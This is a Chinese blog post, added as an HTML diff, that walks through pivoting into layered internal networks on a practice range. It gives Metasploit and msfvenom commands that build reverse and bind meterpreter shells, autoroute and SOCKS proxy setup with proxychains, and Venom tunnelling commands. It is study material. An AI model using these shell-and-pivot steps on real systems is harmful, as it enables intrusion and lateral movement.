@@ -1,0 +1,651 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="关于多层内网渗透0X01:前言在打红日靶场一的时候，开始了解到内网代理的知识。网上有很多文章教我们如何进行内网的代理，虽然步骤很详细，但是却很少有文章说明这一步骤是为什么。可能是大佬，觉得没必要说。但是对于我们这些小白来说，虽然可以照猫画虎，但是却不知道为什么。所以，这篇文章主要是写我在学习内网的多层代理的感悟（小白）。当然，我的学识有限，我的理解不一定是对的。望大佬不吝指教。 0X02：关于内网">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网穿透">
+<meta property="og:url" content="http://example.com/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="关于多层内网渗透0X01:前言在打红日靶场一的时候，开始了解到内网代理的知识。网上有很多文章教我们如何进行内网的代理，虽然步骤很详细，但是却很少有文章说明这一步骤是为什么。可能是大佬，觉得没必要说。但是对于我们这些小白来说，虽然可以照猫画虎，但是却不知道为什么。所以，这篇文章主要是写我在学习内网的多层代理的感悟（小白）。当然，我的学识有限，我的理解不一定是对的。望大佬不吝指教。 0X02：关于内网">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/IMG_20221008_082839.jpg">
+<meta property="og:image" content="http://example.com/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007164816903.png">
+<meta property="og:image" content="http://example.com/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007165311257.png">
+<meta property="og:image" content="http://example.com/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007170653494.png">
+<meta property="og:image" content="http://example.com/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007170227281.png">
+<meta property="og:image" content="http://example.com/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007173233383.png">
+<meta property="og:image" content="http://example.com/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007180942372.png">
+<meta property="og:image" content="http://example.com/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007182408901.png">
+<meta property="og:image" content="http://example.com/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007195344653.png">
+<meta property="og:image" content="http://example.com/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007214825341.png">
+<meta property="og:image" content="http://example.com/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007221513182.png">
+<meta property="og:image" content="http://example.com/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007231738654.png">
+<meta property="og:image" content="http://example.com/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007231918741.png">
+<meta property="og:image" content="http://example.com/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007232024430.png">
+<meta property="og:image" content="http://example.com/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007232328052.png">
+<meta property="og:image" content="http://example.com/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007232645842.png">
+<meta property="og:image" content="http://example.com/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007223303781.png">
+<meta property="og:image" content="http://example.com/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007224010253.png">
+<meta property="og:image" content="http://example.com/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007233445139.png">
+<meta property="og:image" content="http://example.com/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221008002019118.png">
+<meta property="og:image" content="http://example.com/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221008002141196.png">
+<meta property="og:image" content="http://example.com/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221008002226061.png">
+<meta property="og:image" content="http://example.com/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221008003151733.png">
+<meta property="og:image" content="http://example.com/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221008012309043.png">
+<meta property="og:image" content="http://example.com/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221008014606910.png">
+<meta property="og:image" content="http://example.com/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221008020959566.png">
+<meta property="og:image" content="http://example.com/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221008021010546.png">
+<meta property="article:published_time" content="2022-10-08T01:51:45.000Z">
+<meta property="article:modified_time" content="2022-10-08T01:53:32.383Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/IMG_20221008_082839.jpg">
+
+<link rel="canonical" href="http://example.com/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>内网穿透 | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          内网穿透
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-10-08 09:51:45 / 修改时间：09:53:32" itemprop="dateCreated datePublished" datetime="2022-10-08T09:51:45+08:00">2022-10-08</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="关于多层内网渗透"><a href="#关于多层内网渗透" class="headerlink" title="关于多层内网渗透"></a>关于多层内网渗透</h1><h2 id="0X01-前言"><a href="#0X01-前言" class="headerlink" title="0X01:前言"></a>0X01:前言</h2><p>在打红日靶场一的时候，开始了解到内网代理的知识。网上有很多文章教我们如何进行内网的代理，虽然步骤很详细，但是却很少有文章说明这一步骤是为什么。可能是大佬，觉得没必要说。但是对于我们这些小白来说，虽然可以照猫画虎，但是却不知道为什么。所以，这篇文章主要是写我在学习内网的多层代理的感悟（小白）。当然，我的学识有限，我的理解不一定是对的。望大佬不吝指教。</p>
+<h2 id="0X02：关于内网的一些知识"><a href="#0X02：关于内网的一些知识" class="headerlink" title="0X02：关于内网的一些知识"></a>0X02：关于内网的一些知识</h2><ul>
+<li><p><strong>什么是内网：</strong></p>
+<p>​    内网也指局域网，是指在某个区域由多台计算机互连而成的计算机组，组网范围通常在数千米以内。简单来说，内网就是计算机组。在一个内网中可以实现文件管理，软件共享等等。当然现实的内网要复杂的多</p>
+</li>
+<li><p><strong>什么是内网渗透，以及为什么要进行内网渗透</strong></p>
+<p>​    内网渗透可以分为域渗透和工作组渗透，当然这不是我们今天的重点。通常情况下，目标会有一个暴露在外网的服务器（ip：10.10.10.10，和192.168.111.10），还有两台主机（假设为两台），一台pc机（192.168.111.20），一台为域控（192.168.111.30）。当我们拿下服务器的时候，需要在192.168.111这个网段里面进行横向移动，想办法拿下域控，但由于这个网段是内网中，kali机是无法直接访问的。这时候就需要我们将服务器作为跳板机，进而让kali能够访问到192.168.111这个网段。当然，上面只是涉及到两层网络，现实会有多层网络以及复杂的内网环境。</p>
+</li>
+</ul>
+<h2 id="0X03：通过msf-kali自带的proxychain搭建sock代理"><a href="#0X03：通过msf-kali自带的proxychain搭建sock代理" class="headerlink" title="0X03：通过msf+kali自带的proxychain搭建sock代理"></a>0X03：通过msf+kali自带的proxychain搭建sock代理</h2><h3 id="1、环境配置"><a href="#1、环境配置" class="headerlink" title="1、环境配置"></a>1、环境配置</h3><table>
+<thead>
+<tr>
+<th>kali</th>
+<th>192.168.111.129</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>web服务器(window)</td>
+<td>192.168.111.201</td>
+<td>172.10.10.201</td>
+</tr>
+<tr>
+<td>pc(window)</td>
+<td>172.10.10.80</td>
+<td>10.10.10.80</td>
+</tr>
+<tr>
+<td>dc(window)</td>
+<td></td>
+<td>10.10.10.10</td>
+</tr>
+</tbody></table>
+<p>  网络拓扑图如下：</p>
+<img src="/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/IMG_20221008_082839.jpg" class="" title="IMG_20221008_082839">
+
+<p>​    </p>
+<h3 id="2、二层网络的一层代理"><a href="#2、二层网络的一层代理" class="headerlink" title="2、二层网络的一层代理"></a>2、二层网络的一层代理</h3><ul>
+<li><strong>在拿下web服务器后（通过存在漏洞），msf马上传到web服务器</strong></li>
+</ul>
+<h4 id="2-1-传木马"><a href="#2-1-传木马" class="headerlink" title="2.1 传木马"></a>2.1 传木马</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1、首先进入msf生成木马</span><br><span class="line">use payload/windos/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.111.129</span><br><span class="line">set lport 4444</span><br><span class="line">generate -f exe -o shell.exe</span><br><span class="line">会在当前目录下生成shell.exe（这个木马是tcp反向连接lhost，lport就是目标机器会连接lhost的lport）</span><br><span class="line"></span><br><span class="line">2、然后在msf开启监听</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp （这个要和木马的payload一致）</span><br><span class="line">set lhost=0.0.0.0</span><br><span class="line">set lport=4444</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">3、最后将木马上传到</span><br></pre></td></tr></table></figure>
+
+<p><strong>设置好监视器如下</strong></p>
+<img src="/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007164816903.png" class="" title="image-20221007164816903">
+
+
+
+<p><strong>当我们上传好木马并执行后，会返回一个会话</strong></p>
+<img src="/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007165311257.png" class="" title="image-20221007165311257">
+
+
+
+<h4 id="2-2添加路由等等"><a href="#2-2添加路由等等" class="headerlink" title="2.2添加路由等等"></a>2.2添加路由等等</h4><p><strong>查看路由信息</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run get_local_subnets</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>这个得到的路由信息，是web服务器的，正是存在路由，web服务器才能跟10.10.10.0网段通信。具体路由信息可以自学。</strong></p>
+<img src="/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007170653494.png" class="" title="image-20221007170653494">
+
+<p><strong>正式为msf添加路由</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、首先为先查看msf的路由信息</span><br><span class="line">	route print</span><br><span class="line">这里为什么要添加路由，后面在讲</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007170227281.png" class="" title="image-20221007170227281">
+
+<p>这里可以看到，msf什么路由信息也没有</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2、接下来为msf添加路由，</span><br><span class="line">meterpreter&gt;&gt;	run autoroute -s 172.10.10.0/255.255.255.0</span><br><span class="line">meterpreter&gt;&gt;	run qutoroute -p 查看路由有没有添加成功</span><br><span class="line">	这里因为我们想让msf能够访问到172.10.10.10这个网段，所以是172这个</span><br><span class="line">然后我们background 在退出去route print</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007173233383.png" class="" title="image-20221007173233383">
+
+
+
+<p>​    在添加完路由后，msf已经可以访问到内网172.10.10.0这个网段，这时候已经可以调用msf的一些扫描模块对172这个网段进行主机发现等等（注意：是msf不是kali），这时候kali还是没办法访问172这个网段的。这是因为，从上面msf的路由表也可以看到，subnet是172网段，而网关是session8，这个是session8是那个木马返回来的会话。</p>
+<p>​    如果我们想kali能够直接访问到172网段还需要做下面的工作</p>
+<h4 id="2-3-msf启用socks代理-proxychain"><a href="#2-3-msf启用socks代理-proxychain" class="headerlink" title="2.3 msf启用socks代理+proxychain"></a>2.3 msf启用socks代理+proxychain</h4><p><strong>首先msf启用socks代理</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvport 1080</span><br><span class="line">set version 4a 或者5</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">socks4和socks5的区别 </span><br><span class="line">这里简单了解一下：</span><br><span class="line">	SOCKS4只支持TCP应用，而SOCKS5支持TCP和UDP应用。但是由于SOCKS5还支持各种认证机制和域名解析（DNS），SOCKS4不支持，所以出站的SOCKS代理一般是SOCKS4代理。因此，通常不支持UDP应用程序。也就是说，SOCKS5可以支持SOCKS4支持的任何东西，但它与SOCKS4不一样。</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007180942372.png" class="" title="image-20221007180942372">
+
+<p>​    通过这样之后，kali机上的1080端口的流量都会通过msf发出去。但是我们还需要借助proxychain</p>
+<p>将某个软件（比如nmap）的流量发送到本机的1080端口</p>
+<p><strong>kali配置proxychain</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">首先去到kali,修改kali这个配置文件vim /etc/proxychains4.conf </span><br><span class="line">在后面添加 socks4 ip 端口</span><br><span class="line">在需要走socks代理的软件前面加上proxychains,如下。上面是结果</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007182408901.png" class="" title="image-20221007182408901">
+
+<img src="/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007195344653.png" class="" title="image-20221007195344653">
+
+
+
+<p><strong>到这里，我们是完成了两层网络代理配置。到这里我们可以回答为什么要添加路由，</strong></p>
+<p>​        在拿下边界机器后（一般会有两个网卡，内网为B），但是我们msf（攻击）只能访问到A(A是出网的)，因为没有路由找到内网B。当我们通过msf添加路由的时候，msf的流量就可以通过session找到网卡B，从而找到内网B。但是这样的问题是  只有msf的流量能找到内网B，主机的流量还是走的其他网卡。这时候我们就需要在kali机器里面设置全局代理（将流量发到本机某个端口），然后在msf设置代理监听（监听端口）。就类似浏览器设置代理，然后bp监听，这样浏览器的流量就到了bp这里。<br>而这里通过socks设置代理，不会进行拦截，只进行转发，这样本机的机器流量就到了msf，msf在通过路由访问内网</p>
+<h3 id="3-三层网络二层代理"><a href="#3-三层网络二层代理" class="headerlink" title="3.三层网络二层代理"></a>3.三层网络二层代理</h3><p>通过pc（172.10.10.10和10.10.10.10）可能存在的漏洞，我们上传了木马。注意我们这次上传的木马是正向连接的木马。之所以需要正向连接，是因为pc是无法访问192这个网段，自然pc机就不能向kali连接，自然就不能使用反向连接木马。这也是为什么有一些文章说内网跨网段时是无法反向代理连接的。</p>
+<h4 id="3-1生成正向连接木马"><a href="#3-1生成正向连接木马" class="headerlink" title="3.1生成正向连接木马"></a>3.1生成正向连接木马</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1、首先生成木马</span><br><span class="line">msfvenom -p windows/meterpreter/bind_tcp LPORT=4455 -f exe &gt; shell3.exe</span><br><span class="line">这是生成木马第二种方式，pc运行的时候，会在pc打开4455端口，然后kali机去连接.这里pc机是32位的</span><br><span class="line">bind：表示正向连接</span><br><span class="line">-f 格式 因为我们目标机都是windows，所以是exe格式</span><br><span class="line">-o 文件名</span><br><span class="line">p   操作系统/字长/meterpreter/连接方式</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2、监听和上面一样，这里就不多说了</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007214825341.png" class="" title="image-20221007214825341">
+
+
+
+
+
+<h4 id="3-2添加路由"><a href="#3-2添加路由" class="headerlink" title="3.2添加路由"></a>3.2添加路由</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第二步添加路由</span><br><span class="line">meterpreter&gt; run post/multi/manager/autoroute  可以直接自动添加路由</span><br></pre></td></tr></table></figure>
+
+<p>直接就可以了，直接在proxychains nmap 10.10.10.0/24就可以直接扫描了</p>
+<h3 id="4、结尾"><a href="#4、结尾" class="headerlink" title="4、结尾"></a>4、结尾</h3><p>​    通过msf添加路由的方式，比较简单，但缺点是不稳定，而且也比较慢。</p>
+<p>tip：</p>
+<p>​    1、proxychains是kali自带的，windows可以使用proxifier，这个工具蛮强的。</p>
+<p>​    2、proxychain不支持icmp协议，在使用nmap的时候指定参数-Pn</p>
+<h2 id="0X04：通过venom这个小工具进行多级代理"><a href="#0X04：通过venom这个小工具进行多级代理" class="headerlink" title="0X04：通过venom这个小工具进行多级代理"></a>0X04：通过venom这个小工具进行多级代理</h2><h4 id="1、venom介绍"><a href="#1、venom介绍" class="headerlink" title="1、venom介绍"></a>1、venom介绍</h4><p>Venom是一款为渗透测试人员设计的使用Go开发的多级代理工具，可将多个节点进行连接，然后以节点为跳板，构建多级代理。渗透测试人员可以使用Venom轻松地将网络流量代理到多层内网，并轻松地管理代理节点。</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/Dliv3/Venom/releases">https://github.com/Dliv3/Venom/releases</a></p>
+<p>目录结构：可以看到有各个操作系统版本的（admin通常在攻击机运行，agent在目标机上运行）</p>
+<img src="/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007221513182.png" class="" title="image-20221007221513182">
+
+<h4 id="2、venom的使用方法"><a href="#2、venom的使用方法" class="headerlink" title="2、venom的使用方法"></a>2、venom的使用方法</h4><p>​    <strong>正向代理</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">agent.exe -lport 6666 (在目标机运行开启 6666端口)</span><br><span class="line">admin.exe -rhost 172.10.10.201 -rport 8888 (攻击机上运行 去连接rhost的rport)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>反向代理</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">agent.exe -rhost 192.168.111.129 -rport 6666(目标机运行)</span><br><span class="line">admin.exe -lport 6666 </span><br><span class="line">目标机去连接rhost的rport</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="2-2一些命令"><a href="#2-2一些命令" class="headerlink" title="2.2一些命令"></a>2.2一些命令</h5><ul>
+<li><p>show 显示网络拓扑</p>
+<p>如下图,显示有一个结点</p>
+<img src="/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007231738654.png" class="" title="image-20221007231738654"></li>
+</ul>
+<ul>
+<li>goto id 进入某个agent结点</li>
+</ul>
+<img src="/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007231918741.png" class="" title="image-20221007231918741">
+
+<ul>
+<li> shell 获取交互式shell</li>
+</ul>
+  <img src="/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007232024430.png" class="" title="image-20221007232024430">
+
+
+
+<ul>
+<li>socks 端口   会建立你所在结点和admin结点的socks代理</li>
+</ul>
+<img src="/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007232328052.png" class="" title="image-20221007232328052">
+
+
+
+<ul>
+<li><p>help 打印帮助信息</p>
+</li>
+<li><p>listen 端口   监听某个端口</p>
+</li>
+<li><p>upload/download  向所在结点上传或下载文件</p>
+</li>
+<li><p>setdes/getdes    设置和获取结点信息描述</p>
+<img src="/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007232645842.png" class="" title="image-20221007232645842"></li>
+</ul>
+<ul>
+<li>lforward/rforward将本地端口转发到远程/将远程端口转发到本地</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(node 1) &gt;&gt;&gt; lforward 127.0.0.1 8888 8888</span><br><span class="line">forward local network 127.0.0.1 port 8888 to remote port 8888</span><br><span class="line">这个是将admin的8888端口转发到node1结点的8888端口  不是一定要一样</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(node 1) &gt;&gt;&gt; rforward 192.168.111.201 8888 8888</span><br><span class="line">forward remote network 192.168.111.201 port 8888 to local port 8888</span><br><span class="line">将node1 192.168.111.201 的8888端口转发到admin8888端口</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="3、venom实现多级代理"><a href="#3、venom实现多级代理" class="headerlink" title="3、venom实现多级代理"></a>3、venom实现多级代理</h4><h5 id="3-1：二层网络的一层代理"><a href="#3-1：二层网络的一层代理" class="headerlink" title="3.1：二层网络的一层代理"></a>3.1：二层网络的一层代理</h5><p>​    因为web服务器（192.168.111.201和127.10.10.201）是windows的，所以我们将agent.exe上传到web服务器，并执行如下命令</p>
+<img src="/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007223303781.png" class="" title="image-20221007223303781">
+
+<p>​    因为攻击机是linux执行下面命令</p>
+<img src="/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007224010253.png" class="" title="image-20221007224010253">
+
+
+
+<h5 id="3-2启用socks代理"><a href="#3-2启用socks代理" class="headerlink" title="3.2启用socks代理"></a>3.2启用socks代理</h5><img src="/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221007233445139.png" class="" title="image-20221007233445139">
+
+<p>​    这里是在admin这个节点上监听1080端口 ，并将admin的1080端口发到node1这个节点来，也就是    发到web服务器上，注意此时1080并没有也不需要开启1080端口</p>
+<p>然后修改proxychain的配置文件，这里我偷个懒设置为1080，这样就不用设置proxychain的配置文件了</p>
+<p>tip：本来还想偷个懒的，但是后面发现好像不支持socks4   改为socks5就可以了。。。。。</p>
+<h5 id="3-3-三层网络的二层代理"><a href="#3-3-三层网络的二层代理" class="headerlink" title="3.3 三层网络的二层代理"></a>3.3 三层网络的二层代理</h5><p><strong>1、首先在web机开启监听端口（注意此时是在node1节点开启了监听7777端口</strong></p>
+<img src="/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221008002019118.png" class="" title="image-20221008002019118">
+
+
+
+<p><strong>2、然后去到pc机去连接127.10.10.201（也就是node1节点）</strong></p>
+<img src="/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221008002141196.png" class="" title="image-20221008002141196">
+
+<img src="/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221008002226061.png" class="" title="image-20221008002226061">
+
+<p>可以发现已上线。</p>
+<p><strong>3、然后进入到节点2中开启socks代理</strong></p>
+<img src="/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221008003151733.png" class="" title="image-20221008003151733">
+
+<p>​    这里是开启admin8888端口到node2节点的socks通道</p>
+<p><strong>4、最后，修改一下proxychain的配资文件 改端口为8888就可以了。</strong></p>
